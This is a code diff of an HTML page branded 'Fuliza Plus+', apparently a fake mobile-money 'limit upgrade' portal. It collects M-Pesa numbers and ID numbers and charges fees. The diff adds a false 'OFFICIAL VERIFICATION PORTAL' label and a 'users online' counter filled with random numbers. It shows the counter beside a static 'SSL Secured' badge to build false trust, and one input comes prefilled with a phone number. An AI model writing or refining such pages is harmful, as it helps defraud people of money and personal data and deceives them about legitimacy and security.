@@ -8,14 +8,13 @@
 <style>
 body {
   font-family: Arial, sans-serif;
-  background: #f3f4f6;
+  background: linear-gradient(135deg, #ecfdf5, #f3f4f6);
   margin: 0;
+  height: 100vh;
 
-  /* ✅ CENTER FIX */
   display: flex;
   justify-content: center;
   align-items: center;
-  height: 100vh;
 }
 
 /* WRAPPER */
@@ -28,36 +27,41 @@ body {
 /* CARD */
 .card {
   background: white;
-  padding: 20px;
-  border-radius: 20px;
-  max-width: 400px;
-  width: 100%;
-  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+  padding: 25px;
+  border-radius: 22px;
+  width: 90%;
+  max-width: 380px;
+  text-align: center;
+  box-shadow: 0 15px 40px rgba(0,0,0,0.08);
 }
 
+/* BUTTON */
 button {
-  padding: 15px;
+  padding: 14px;
   border-radius: 12px;
   border: none;
   width: 100%;
   font-size: 16px;
-  margin-top: 10px;
+  margin-top: 12px;
+  cursor: pointer;
 }
 
 .green { background: #16a34a; color: white; }
 .dark { background: #0f172a; color: white; }
 
+/* INPUT */
 .input {
   width: 100%;
   padding: 14px;
   border-radius: 12px;
   border: 1px solid #ddd;
-  margin-top: 10px;
+  margin-top: 12px;
 }
 
+/* LOADER */
 .loader {
-  width: 50px;
-  height: 50px;
+  width: 55px;
+  height: 55px;
   border: 5px solid #e5e7eb;
   border-top: 5px solid #16a34a;
   border-radius: 50%;
@@ -69,15 +73,17 @@ button {
   100% { transform: rotate(360deg); }
 }
 
+/* GRID */
 .grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
-  gap: 10px;
+  gap: 12px;
+  margin-top: 10px;
 }
 
 .box {
-  padding: 15px;
-  border-radius: 12px;
+  padding: 14px;
+  border-radius: 14px;
   background: #f9fafb;
   border: 2px solid transparent;
   cursor: pointer;
@@ -85,7 +91,7 @@ button {
 
 .box.active {
   border: 2px solid #16a34a;
-  background: #e8f5e9;
+  background: #ecfdf5;
 }
 
 .fee {
@@ -94,20 +100,28 @@ button {
   margin-top: 5px;
 }
 
+/* LIVE */
+.activity {
+  margin-top: 12px;
+  font-size: 13px;
+  color: #555;
+}
+
+/* MODAL */
 .modal {
   position: fixed;
   top:0; left:0;
   width:100%; height:100%;
   background: rgba(0,0,0,0.4);
   display:none;
-  align-items:center;
   justify-content:center;
+  align-items:center;
 }
 
 .modal-content {
   background:white;
   width:90%;
-  max-width:400px;
+  max-width:380px;
   border-radius:20px;
   overflow:hidden;
 }
@@ -121,11 +135,18 @@ button {
 .modal-body { padding:20px; }
 
 .info {
-  background:#e8f5e9;
+  background:#ecfdf5;
   padding:10px;
   border-radius:10px;
   margin-bottom:10px;
 }
+
+.actions {
+  display: flex;
+  gap: 10px;
+}
+
+.cancel { background:#e5e7eb; color:black; }
 </style>
 </head>
 
@@ -146,8 +167,10 @@ button {
       <input class="input" placeholder="ID Number">
       <input class="input" value="0704343709">
 
-      <button onclick="closeModal()">Cancel</button>
-      <button class="green" id="payBtn">Pay</button>
+      <div class="actions">
+        <button class="cancel" onclick="closeModal()">Cancel</button>
+        <button class="green" id="payBtn">Pay</button>
+      </div>
     </div>
   </div>
 </div>
@@ -176,16 +199,49 @@ function getFee(amount){
   return limits.find(l => l.amount === amount).fee;
 }
 
+/* LIVE USERS */
+let liveUsers = 120;
+setInterval(()=>{
+  liveUsers = Math.floor(Math.random()*200)+100;
+  const el = document.getElementById("live");
+  if(el) el.innerText = "● " + liveUsers + " users online  |  🔒 SSL Secured";
+},2000);
+
 function render(){
   const app = document.getElementById("app");
 
+  /* ✅ STEP 1 (UPDATED DESIGN) */
   if(step === 1){
     app.innerHTML = `
     <div class="card">
-      <h2>Fuliza Plus+</h2>
-      <p>Verify your identity</p>
-      <input class="input" placeholder="Enter M-Pesa Number">
-      <button class="green" onclick="next()">Check My Eligibility</button>
+
+      <div style="width:80px;height:80px;margin:auto;border-radius:50%;background:#ecfdf5;display:flex;align-items:center;justify-content:center;font-size:35px;color:#16a34a;margin-bottom:15px;">
+        👤
+      </div>
+
+      <h2 style="font-size:24px;font-weight:700;">Fuliza Plus+</h2>
+
+      <div style="color:#16a34a;font-size:12px;letter-spacing:1px;margin-bottom:10px;font-weight:600;">
+        OFFICIAL VERIFICATION PORTAL
+      </div>
+
+      <p style="color:#6b7280;font-size:14px;">
+        Verify your identity to unlock higher daily transaction limits.
+      </p>
+
+      <div style="display:flex;align-items:center;background:#f9fafb;border:1px solid #e5e7eb;border-radius:14px;padding:12px;margin-top:15px;">
+        <span style="margin-right:10px;">📞</span>
+        <input type="text" placeholder="Enter M-Pesa Number" style="border:none;outline:none;background:transparent;width:100%;">
+      </div>
+
+      <button class="green" onclick="next()" style="border-radius:14px;font-weight:600;">
+        Check My Eligibility →
+      </button>
+
+      <div class="activity" id="live">
+        ● 120 users online  |  🔒 SSL Secured
+      </div>
+
     </div>`;
   }
 
@@ -228,6 +284,7 @@ function render(){
       <button class="green" onclick="openModal()">
         UPGRADE TO Ksh ${selectedAmount}
       </button>
+      <div class="activity" id="live">● 120 users online  |  🔒 SSL Secured</div>
     </div>`;
   }
 }
